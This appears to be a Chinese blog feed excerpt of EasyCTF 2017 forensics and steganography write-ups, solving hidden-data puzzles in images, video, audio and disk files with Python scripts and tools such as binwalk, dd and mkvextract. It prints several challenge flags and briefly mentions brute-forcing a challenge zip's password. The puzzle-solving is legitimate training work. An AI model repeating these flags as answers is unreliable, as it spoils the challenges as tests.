href="#solution-6" class="headerlink" title="solution"></a>solution</h2><p><img src="http://i.imgur.com/JXa15my.png" alt=""></p><p>首先看到二维码的定位标识被反相处理了，题目还提示了说图像只有黑色和白色吗，于是推测图像可能不止黑白两种颜色，于是打开PS不断锐化原图像果然发现一些接近黑色的颜色被暴露：</p><p><img src="http://i.imgur.com/VW7Guej.png" alt=""></p><p>需要把接近黑色的颜色画成黑色，手动画图挺麻烦还是上脚本：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(image)</span>:</span></div><div class="line">    pixels = image.load()</div><div class="line">    width = image.size[<span class="number">0</span>]</div><div class="line">    height = image.size[<span class="number">1</span>]</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(width):</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(height):</div><div class="line">            <span class="keyword">if</span> (pixels[x, y] != <span class="number">255</span>):</div><div class="line">                <span class="keyword">if</span> pixels[x, y] &lt; <span class="number">125</span>:</div><div class="line">                    pixels[x, y] = <span class="number">0</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    pixels[x, y] = <span class="number">255</span></div><div class="line">    <span class="keyword">return</span> image</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    image = Image.open(<span class="string">'qr1.bmp'</span>)</div><div class="line">    image = image.convert(<span class="string">'L'</span>)</div><div class="line">    processed_image = process(image)</div><div class="line">    processed_image.save(<span class="string">'solved.bmp'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>得到处理后的图像：</p><p><img src="http://i.imgur.com/uYsm0HM.png" alt=""></p><p>接下来对定位标识进行反相处理：</p><p><img src="http://i.imgur.com/d304P3b.png" alt=""></p><pre><code>easyctf{n0w_who-w0u1d_do_thAT_to_Th3ir_QR?}</code></pre><h2 id="Ogrewatch"><a href="#Ogrewatch" class="headerlink" title="Ogrewatch"></a>Ogrewatch</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>My friend was out watching ogres when he heard a strange sound. Could you figure out what it means? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/ogrewatch/ogreman" target="_blank" rel="external">ogreman</a><br>Hint：If you’re having trouble with the file format, Gary Kessler might help.</p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><pre><code>root@kali:~/Desktop# file ogreman ogreman: Matroska data</code></pre><p>在了解一波<a href="http://www.cnblogs.com/loleng/articles/2032722.html" target="_blank" rel="external">MATROSKA 文件格式</a><br>给文件加上<code>.mka</code>后缀后使用Pot Player播放时有字幕一闪而过：</p><p><img src="http://i.imgur.com/ZamTYr0.png" alt=""></p><p>于是使用MATROSKA文件处理工具<a href="https://mkvtoolnix.download/downloads.html" target="_blank" rel="external">MKVToolNix</a>中的mkvextract将字幕导出：</p><p><img src="http://i.imgur.com/gWQ2Fc4.png" alt=""></p><p><img src="http://i.imgur.com/LRG3Pri.png" alt=""></p><pre><code>λ mkvextract.exe tracks 132ea90b28084ca59d251988faeecf40e4879b98_ogreman 2:zimu</code></pre><p><img src="http://i.imgur.com/2UEtJ9u.png" alt=""></p><p><img src="http://i.imgur.com/7giXxDP.png" alt=""></p><p>将有flag的部分提取出来单独处理：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>) <span class="keyword">as</span> file:</div><div class="line">    lines_list = file.readlines()</div><div class="line">    flag = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines_list:</div><div class="line">        flag = flag + line[<span class="number">50</span>]</div><div class="line">    print(flag) <span class="comment"># easyctf&#123;subs_r_b3tt3r_th@n_dub5&#125;</span></div></pre></td></tr></table></figure><p></p><h2 id="Flag-PEG"><a href="#Flag-PEG" class="headerlink" title="Flag PEG"></a>Flag PEG</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>We found a flag but it didn’t do anything. Maybe you can find a better <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/flag-peg/heresaflag.jpg" target="_blank" rel="external">flag</a>?<br>You’re not looking deep enough.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><pre><code>sunnyelf@ubuntu:~/Desktop$ binwalk -v heresaflag Scan Time:     2017-03-26 09:29:30Target File:   /home/sunnyelf/Desktop/heresaflagMD5 Checksum:  890fad720c23e53f4698ac04bc5f9a23Signatures:    344DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             JPEG image data, EXIF standard12            0xC             TIFF image data, big-endian, offset of first image directory: 818357         0x47B5          Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&quot;&gt; &lt;rdf:Description rdf:about=&quot;&quot; xmlns:xmpMM=&quot;http://ns.adobe.com/xap/1.0/mm/&quot; xmlns:stEvt=341939        0x537B3         7-zip archive data, version 0.3</code></pre><hr><pre><code>sunnyelf@ubuntu:~/Desktop$ dd if=heresaflag of=1.7z skip=341939 bs=1记录了156772+0 的读入记录了156772+0 的写出156772 bytes (157 kB, 153 KiB) copied, 0.211627 s, 741 kB/s</code></pre><hr><pre><code>sunnyelf@ubuntu:~/Desktop$ 7z e 1.7z 7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18p7zip Version 9.20 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,1 CPU)Processing archive: 1.7zExtracting  KHgrbikqKC0xKV5uEverything is OkSize:       155553Compressed: 156772</code></pre><hr><pre><code>sunnyelf@ubuntu:~/Desktop$ python -c &quot;import base64;print base64.b64decode(&apos;KHgrbikqKC0xKV5u&apos;)&quot;(x+n)*(-1)^n</code></pre><p>看到<code>(x+n)*(-1)^n</code>可能是加密算法，而<code>KHgrbikqKC0xKV5u</code>文件可能就是已加密的文件，先拖进Hex Editor Neo看看：</p><p><img src="http://i.imgur.com/EnpPx3p.png" alt=""></p><p>看到第一个字节是0x89第一反应可能png的头，推测该加密的文件原文件是png文件，如果x表示字节内容，n表示顺序的话简单地来验证一下（0x89 = 137）：<code>（137+0）*(-1)^0=137</code>，果然计算结果相同，那么把png文件头都使用<code>(x+n)*(-1)^n</code>加密再和已加密的文件对比一下呢：</p><p><img src="http://i.imgur.com/C8uOGMA.png" alt=""></p><p>结果发现规律，png文件头上的偶数位字节数值（从0开始数起）加密计算后总是与给的文件偶数位上字节数值相等，png文件头上的奇数位字节数值加密后与给的文件奇数位上的字节数值满足一种关系：给的文件奇数位上的字节数值减去经过加密的数值恒等于256，比如<code>175-(-81)=256</code> <code>182-(-74)=256</code>，如果<code>y=(x+n)*(-1)^n</code>，那么<code>x=y/(-1)^n-n</code> ，注意计算结果可能为负值，所以要模256，所以接下来就交给脚本：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">decrypt_data = <span class="string">''</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'KHgrbikqKC0xKV5u'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> encrypted_file:</div><div class="line">    n = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        byte = encrypted_file.read(<span class="number">1</span>)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> byte:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        d = ord(byte)</div><div class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">            y = d</div><div class="line">            x = (y / ((<span class="number">-1</span>) ** n) - n) % <span class="number">256</span></div><div class="line">            decrypt_data += chr(x)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            y = (d - <span class="number">256</span>)</div><div class="line">            x = (y / ((<span class="number">-1</span>) ** n) - n) % <span class="number">256</span></div><div class="line">            decrypt_data += chr(x)</div><div class="line">        n += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'decrypt_file.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> decrypt_file:</div><div class="line">    decrypt_file.write(decrypt_data)</div><div class="line"></div><div class="line">![](http://i.imgur.com/pa2rb5b.png)</div></pre></td></tr></table></figure><p></p><h2 id="My-USB"><a href="#My-USB" class="headerlink" title="My USB"></a>My USB</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>I found my <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/my-usb/usb.img" target="_blank" rel="external">usb</a> from a long time ago. I know there’s a flag on there somewhere; can you help me find it?</p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">    root@kali:~/Desktop<span class="comment"># mv 2c370b79d147127064f019dcb05bba1aa917c552_usb.img usb.img</span></div><div class="line">    root@kali:~/Desktop<span class="comment"># binwalk -v usb.img </span></div><div class="line">    root@kali:~/Desktop<span class="comment"># foremost usb.img</span></div><div class="line"></div><div class="line">![](http://i.imgur.com/XCcilKC.jpg)</div></pre></td></tr></table></figure><h2 id="Finn"><a href="#Finn" class="headerlink" title="Finn"></a>Finn</h2><h3 id="problem-11"><a href="#problem-11" class="headerlink" title="problem"></a>problem</h3><p>The Resistance intercepted this suspicious <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/finn/finn.jpg" target="_blank" rel="external">picture</a> of Finn’s old stormtrooper helmet, sent by General Hux to Kylo Ren. Hux isn’t exactly Finn’s biggest fan. What could he be hiding? Good luck!</p><p>If you get stuck, We also have <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/finn/help.txt" target="_blank" rel="external">this</a> blob of sarcasm, which may or may not be useful in your quest. Worth a shot right?</p><p>Hint：In hindsight, numerical pins make really bad passwords . . . especially if they are pop culture references, also some pixels differ by more than one</p><pre><code>Everyone complains that my problems are too random. Fine. Here is EXACTLY how to solve this problem.1. Wow I have an image. I wonder why it’s so big (read: grandma, what large eyes you have)2. So I figured that part out. Great, there’s a password. I wonder what that has to do with this image. Or wait, I could just brute force it, right? Either way works. It’s called reading the problem description. Or even the title. Titles do matter.3. Yay, 2 images. What’s the difference? Hmmmm, I wonder what would happen if I ressed that difference pictorially. 4. Well I got some stuff, but it makes no sense. Oh wait, maybe I need a key! Let’s go back to that thing we extracted earlier, shall we? Maybe those discrepancies are ACTUALLY USEFUL. Nothing is an accident, not even random out of place pixels. Check them. Carefully.5. What do I do with this message and key? How about, the most obvious thing in every CTF ever. Seriously.So you got the flag. Congrats! See, it wasn’t that bad.</code></pre><h3 id="solution-10"><a href="#solution-10" class="headerlink" title="solution"></a>solution</h3><pre><code>root@kali:~/Desktop# file finn.jpg finn.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 118x118, segment length 16, baseline, precision 8, 630x630, frames 3root@kali:~/Desktop# binwalk -v finn.jpg Scan Time:     2017-03-27 03:53:23Target File:   /root/Desktop/finn.jpgMD5 Checksum:  e09ee29407ca1b68db84dae5be8a52d4Signatures:    344DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             JPEG image data, JFIF standard 1.0144350         0xAD3E          Zip archive data, at least v1.0 to extract, name: kylo/44413         0xAD7D          Zip archive data, encrypted at least v2.0 to extract, compressed size: 3489072, uncompressed size: 3488525, name: kylo/kylo1.png3533573       0x35EB05        Zip archive data, encrypted at least v2.0 to extract, compressed size: 3489495, uncompressed size: 3488948, name: kylo/kylo2.png7023399       0x6B2B27        End of Zip archiveroot@kali:~/Desktop# foremost finn.jpg Processing: finn.jpg|foundat=kylo/UT    foundat=kylo/kylo1.pngUT*|</code></pre><p>得到一个加密的zip，尝试暴力破解：</p><p><img src="http://i.imgur.com/3px1Yhk.png" alt=""></p><p>解压得到两种表面上相似的png图片，使用Stegsolve对比检测，当浏览到sub模式时：</p><p><img src="http://i.imgur.com/IxCNgBH.png" alt=""></p><p>扫码得到26个hex值：<code>\x63\x68\x66\x63\x7e\x71\x73\x34\x76\x57\x72\x3c\x74\x73\x5c\x31\x75\x5d\x6b\x32\x34\x77\x59\x38\x4c\x7f</code>，尝试解码得到<code>chfc~qs4vWr&lt;ts\1u]k24wY8L</code>，结果不是flag，根据提示又看比较出来的二维码左下角貌似多了一些像素，于是在PS中对比才发现还有一些像素stegsolve没有提取出来：</p><p><img src="http://i.imgur.com/LKgx5FB.png" alt=""></p><p><img src="http://i.imgur.com/kp064eW.png" alt=""></p><p>刚好26个像素，将它们的灰度值提取出来：<code>5,4,7,4,5,2,7,0,4,8,5,8,6,0,3,0,6,2,9,1,1,3,6,2,8,2</code>，写个脚本异或看看：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a = [<span class="number">0x63</span>,<span class="number">0x68</span>,<span class="number">0x66</span>,<span class="number">0x63</span>,<span class="number">0x7e</span>,<span class="number">0x71</span>,<span class="number">0x73</span>,<span class="number">0x34</span>,<span class="number">0x76</span>,<span class="number">0x57</span>,<span class="number">0x72</span>,<span class="number">0x3c</span>,<span class="number">0x74</span>,<span class="number">0x73</span>,<span class="number">0x5c</span>,<span class="number">0x31</span>,<span class="number">0x75</span>,<span class="number">0x5d</span>,<span class="number">0x6b</span>,<span class="number">0x32</span>,<span class="number">0x34</span>,<span class="number">0x77</span>,<span class="number">0x59</span>,<span class="number">0x38</span>,<span class="number">0x4c</span>,<span class="number">0x7f</span>]</div><div class="line">b = [<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>]</div><div class="line">c = []</div><div class="line">d = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(len(a)):</div><div class="line">c.append(a[x] ^ b[x])</div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(len(c)):</div><div class="line">d += chr(c[y])</div><div class="line">print(d) <span class="comment"># flag&#123;st4r_w4rs_1s_b35t_:D&#125;</span></div></pre></td></tr></table></figure><p></p><h2 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h2><h3 id="problem-12"><a href="#problem-12" class="headerlink" title="problem"></a>problem</h3><p>I was listening to <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/serial/serial.wav" target="_blank" rel="external">this</a> haystack, but I didn’t notice anything. What did I miss?</p><p>hint: 010100110110010101110010011010010110000101101100001011100010111000101110</p><h3 id="solution-11"><a href="#solution-11" class="headerlink" title="solution"></a>solution</h3><p><a href="https://writeups.easyctf.com/forensics/serial-300-points.html" target="_blank" rel="external">writeup</a></p><h2 id="Decomphose"><a href="#Decomphose" class="headerlink" title="Decomphose"></a>Decomphose</h2><h3 id="problem-13"><a href="#problem-13" class="headerlink" title="problem"></a>problem</h3><p>Image arithmetic is super neat until there’s more than two images involved.</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 1</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 2</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 3</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md" target="_blank" rel="external">file 4</a></p><h3 id="solution-12"><a href="#solution-12" class="headerlink" title="solution"></a>solution</h3><p>给了4个压缩包，分别解压一共得到48张类似这样的图片：</p><p><img src="http://i2.muimg.com/589513/2dc8a42fc304928d.png" alt=""></p><p>放大可以看到一些像素被周围黑色像素包围，其他的图片打开放大看也是这种情况，所以尝试把所有图片中被黑色像素包围的像素提取到一张图片上看看：</p><p><img src="http://i2.muimg.com/589513/6310820be44f7c7e.png" alt=""><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">flag = Image.new(<span class="string">"RGB"</span>, (<span class="number">1280</span>, <span class="number">720</span>))</div><div class="line">path = <span class="string">"E:\sunnyelf\Desktop\easyctf 2017\Forensics\Decomphose\decomp"</span></div><div class="line"><span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir(path):</div><div class="line">    f = Image.open(path + <span class="string">"\\"</span> + file_name)</div><div class="line">    width, height = f.size</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(width):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(height):</div><div class="line">            add = <span class="keyword">True</span></div><div class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> <span class="keyword">and</span> f.getpixel((i - <span class="number">1</span>, j)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (i &lt; width - <span class="number">1</span> <span class="keyword">and</span> f.getpixel((i + <span class="number">1</span>, j)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (j &gt; <span class="number">0</span> <span class="keyword">and</span> f.getpixel((i, j - <span class="number">1</span>)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (j &lt; height - <span class="number">1</span> <span class="keyword">and</span> f.getpixel((i, j + <span class="number">1</span>)) != (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)):</div><div class="line">                add = <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> (add):</div><div class="line">                flag.putpixel((i, j), f.getpixel((i, j)))</div><div class="line">flag.save(<span class="string">"flag.png"</span>)</div></pre></td></tr></table></figure><p></p><p>跑了3分钟左右，看看结果：</p><p><img src="http://i1.piimg.com/589513/2259f6dc3ee320ac.png" alt=""></p><h2 id="QR2"><a href="#QR2" class="headerlink" title="QR2"></a>QR2</h2><h3 id="problem-14"><a href="#problem-14" class="headerlink" title="problem"></a>problem</h3><p>When I am not practicing my <a href="https://en.wikipedia.org/wiki/Oboe" target="_blank" rel="external">Oboe</a> for band, I have been working on a QR code generator. For some reason, some of the images are not scannable. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qr-2/qr2.bmp" target="_blank" rel="external">Here</a> is one, can you tell me what it says?</p><p>NOTE: Due to a flag leak, this is a re-release of the problem with a new flag.</p><p>hint: Is there another kind of Oboe?</p><h3 id="solution-13"><a href="#solution-13" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/forensics/QR2" target="_blank" rel="external">writeup</a></p><h1 id="0x03-Steganography"><a href="#0x03-Steganography" class="headerlink" title="0x03 Steganography"></a>0x03 Steganography</h1><h2 id="Kittycat"><a href="#Kittycat" class="headerlink" title="Kittycat"></a>Kittycat</h2><h3 id="problem-15"><a href="#problem-15" class="headerlink" title="problem"></a>problem</h3><p>My <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/kittycat/kittycat.avi" target="_blank" rel="external">cats</a> are cuter than yours :)<br>hint: I used to have one cat, but now I have two.</p><h3 id="solution-14"><a href="#solution-14" class="headerlink" title="solution"></a>solution</h3><p><a href="http://wenku.baidu.com/view/bbffdc4203d8ce2f006623b3" target="_blank" rel="external">图像处理基本知识</a></p><p><a href="http://wenku.baidu.com/view/427b9c5aa76e58fafab003c2" target="_blank" rel="external">图像基本运算</a></p><p><a href="https://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_setup/py_setup_in_windows/py_setup_in_windows.html#install-opencv-python-in-windows" target="_blank" rel="external">Install OpenCV-Python in Windows</a></p><pre><code>ffmpeg -i kittycat.avi kittycat%01d.png</code></pre><p>把视频每帧分离后得到606张png图片，每两张表面看上去相似，先尝试每两张异或提取出不同的地方：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cv2</div><div class="line"></div><div class="line">i = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">607</span>, <span class="number">2</span>):   </div><div class="line">    img1 = cv2.imread(<span class="string">'kittycat'</span> + str(x) +<span class="string">'.png'</span>)</div><div class="line">    img2 = cv2.imread(<span class="string">'kittycat'</span> + str(x + <span class="number">1</span>) +<span class="string">'.png'</span>)</div><div class="line">    xor_img = cv2.bitwise_xor(img1, img2)</div><div class="line">    cv2.imwrite(<span class="string">'xor/xor_img'</span> + str(i) + <span class="string">'.png'</span>, xor_img)</div><div class="line">    i += <span class="number">1</span></div></pre></td></tr></table></figure><p></p><p>得到303张异或后的图片，尝试将它们全部相加：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cv2</div><div class="line"></div><div class="line">add_img = cv2.imread(<span class="string">'xor_img1.png'</span>)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">2</span>, <span class="number">304</span>):</div><div class="line">    img = cv2.imread(<span class="string">'xor_img'</span>+ str(x) +<span class="string">'.png'</span>)</div><div class="line">    add_img = cv2.add(add_img, img)</div><div class="line"></div><div class="line">cv2.imwrite(<span class="string">'add_img.png'</span>, add_img)</div><div class="line"></div><div class="line">![](http://i.imgur.com/<span class="number">87</span>WajrC.png)</div></pre></td></tr></table></figure><p></p><p>PS处理一下：</p><p><img src="http://chuantu.biz/t5/53/1490695174x2890174033.png" alt=""></p><p><img src="http://chuantu.biz/t5/53/1490700824x2890174033.png" alt=""></p><h2 id="Bizarro"><a href="#Bizarro" class="headerlink" title="Bizarro"></a>Bizarro</h2><h3 id="problem-16"><a href="#problem-16" class="headerlink" title="problem"></a>problem</h3><p>Something seems very strange about <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/bizarro/crpt.png" target="_blank" rel="external">this</a> strange looking image. Check it out?</p><p>hint: Red herrings are always a <em>touchy</em> subject. Combine this hint with intel you find in the problem, throw in a blind guess, and perhaps you’ll stumble into the answer.</p><h3 id="solution-15"><a href="#solution-15" class="headerlink" title="solution"></a>solution</h3><p><img src="http://i1.piimg.com/589513/a9b2436a74dde6cd.png" alt=""></p><pre><code>CI XCVII CXV CXXI XCIX CXVI CII CXXIII CXVI CIV CV CXV XCV CV CXV XCV CX CXI CXVI XCV CXVI CIV CI XCV CII CVIII XCVII CIII CXXV XXXII CV XXXII CVII CX CXI CXIX XXXII CXVI CIV CV CXV XXXII CII CVIII XCVII CIII XXXII CV CXV XXXII CXIX CI CV CXIV C XXXII CV XXXII CVI CXVII CXV CXVI XXXII XCIX XCVII CX XXXIX CXVI XXXII CXII CXVII CXVI XXXII CIX CXXI XXXII CII CV CX CIII CI CXIV XXXII CXI CX XXXII CXIX CIV CXXI</code></pre><p>罗马数字<a href="https://en.wikipedia.org/wiki/Roman_numerals" target="_blank" rel="external">Roman numerals</a></p><p><a href="http://www.dcode.fr/roman-numerals" target="_blank" rel="external">在线转换</a>一下，得到一些数字，数字大小都不超过255，有可能是ASCII值：</p><p><img src="http://i1.piimg.com/589513/d6ebdad9155c13bd.png" alt=""><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nums = [<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">95</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">125</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">32</span>,<span class="number">107</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">119</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">32</span>,<span class="number">106</span>,<span class="number">117</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">109</span>,<span class="number">121</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">119</span>,<span class="number">104</span>,<span class="number">121</span>]</div><div class="line"></div><div class="line">txt = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    txt += chr(n)</div><div class="line">print(txt)</div></pre></td></tr></table></figure><p></p><pre><code>easyctf{this_is_not_the_flag} i know this flag is weird i just can&apos;t put my finger on why</code></pre><p>额，好吧，后来看了大神的<a href="https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/forensics/bizarro" target="_blank" rel="external">writeup</a>跪了。</p>]]></content>
    
    <summary type="html">
    
      作者:Jing Ling [https://www.zhihu.com/people/sunnyelf/]
博客:HackFun [https://www.hackfun.org/]

#0X02-FORENSICS0X02 FORENSICS
#MANE-EVENTMANE EVENT
#PROBLEMPROBLEM
My friend just got back from the plains and he took this picture with his new
camera. He also told me there’s a flag hidden in it - can you check it out for
me?
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="forensics" scheme="https://sunnyelf.github.io/tags/forensics/"/>
    
      <category term="ctf writeup" scheme="https://sunnyelf.github.io/tags/ctf-writeup/"/>
    
      <category term="easyctf" scheme="https://sunnyelf.github.io/tags/easyctf/"/>
    
  </entry>
  
  <entry>
    <title>EasyCTF 2017 Misc Pro Write Up</title>
    <link href="https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Misc-Pro-Write-Up/"/>
    <id>https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Misc-Pro-Write-Up/</id>
